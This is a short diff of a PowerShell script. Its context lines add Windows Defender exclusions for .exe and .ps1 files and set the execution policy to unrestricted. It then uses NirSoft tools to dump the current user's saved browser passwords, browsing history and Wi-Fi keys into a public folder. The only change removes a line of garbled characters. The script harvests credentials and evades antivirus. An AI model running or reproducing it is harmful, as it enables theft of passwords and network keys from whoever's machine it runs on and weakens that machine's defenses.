@@ -3,7 +3,6 @@ Add-MpPreference -ExclusionExtension exe -Force
 Add-MpPreference -ExclusionExtension ps1 -Force
 Set-ExecutionPolicy unrestricted -Force
 New-Item -Path "C:\Users\Public\Documents\dump" -ItemType Directory
-ifbcz3gUv[r0<Un7|
 .\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt 
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt
 .\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt 
